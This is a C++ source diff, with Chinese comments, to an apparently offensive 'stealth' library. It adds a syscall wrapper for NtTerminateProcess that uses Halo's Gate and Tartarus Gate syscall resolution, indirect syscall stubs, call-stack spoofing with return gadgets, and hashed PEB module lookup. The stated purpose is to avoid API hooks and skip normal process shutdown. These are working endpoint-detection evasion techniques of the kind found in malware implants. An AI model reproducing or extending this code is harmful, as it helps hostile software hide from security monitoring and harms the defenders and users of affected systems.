@@ -321,6 +321,8 @@ bool SyscallResolver::Initialize() {
     m_numbers.NtAdjustPrivilegesToken   = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtAdjustPrivilegesToken")));
     m_numbers.NtOpenProcessToken        = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtOpenProcessToken")));
     m_numbers.NtQueryInformationToken   = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtQueryInformationToken")));
+    // ★ v3.296 FIX-19: NtTerminateProcess — 替代 ExitProcess
+    m_numbers.NtTerminateProcess        = ExtractSyscallNumber(reinterpret_cast<BYTE*>(STEALTH_GET_PROC_ADDRESS_NOREF(ntdll, "NtTerminateProcess")));
 
     // 2. 检查关键函数是否被 Hook, 必要时启用 Halo's Gate
     // (延迟到首次实际调用时, 避免在初始化阶段触发表征)
@@ -1532,6 +1534,38 @@ NTSTATUS SysQueryInformationToken(
     using Fn = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
     return reinterpret_cast<Fn>(stub)(TokenHandle, TokenInformationClass, TokenInformation,
                                       TokenInformationLength, ReturnLength);
+}
+
+// ---- SysTerminateProcess (替代 ExitProcess) ----
+// ★ v3.296 FIX-19: NtTerminateProcess syscall — 绕过 ExitProcess 的 LdrShutdownProcess
+NTSTATUS SysTerminateProcess(
+    HANDLE ProcessHandle, NTSTATUS ExitStatus, SyscallMethod method)
+{
+    auto& resolver = SyscallResolver::Instance();
+    DWORD ssn = resolver.GetNumbers().NtTerminateProcess;
+    if (!ssn) { resolver.InitializeHaloGate(); ssn = resolver.GetNumbers().NtTerminateProcess; }
+
+    SyscallMethod m = DecideMethod(method);
+    void* stub = nullptr;
+    if (m == SyscallMethod::StackSpoof) {
+        uintptr_t gadget = resolver.GetSyscallRetGadget();
+        int retGadgetCount = GetRetGadgetCount();
+        auto spoofCtx = CallStackSpoofer::Instance().GetRandomSpoofContext();
+        if (gadget && retGadgetCount >= 4) {
+            stub = GenerateDeepSpoofStub(ssn, gadget, s_cachedRetGadgets, retGadgetCount, spoofCtx);
+        }
+    }
+    if (!stub && m == SyscallMethod::Indirect) {
+        stub = GenerateIndirectSyscallStub(ssn, resolver.GetSyscallRetGadget());
+    }
+    if (!stub) stub = TartarusGate::GenerateSyscallStub(ssn);
+    if (!stub) {
+        using Fn = NTSTATUS(NTAPI*)(HANDLE, NTSTATUS);
+        auto fn = reinterpret_cast<Fn>(STEALTH_GET_PROC_ADDRESS_NOREF(stealth::GetModuleBaseFromPEB(stealth::ModNameHash(L"ntdll.dll")), "NtTerminateProcess"));
+        return fn ? fn(ProcessHandle, ExitStatus) : STATUS_NOT_SUPPORTED;
+    }
+    using Fn = NTSTATUS(NTAPI*)(HANDLE, NTSTATUS);
+    return reinterpret_cast<Fn>(stub)(ProcessHandle, ExitStatus);
 }
 
 } // namespace stealth
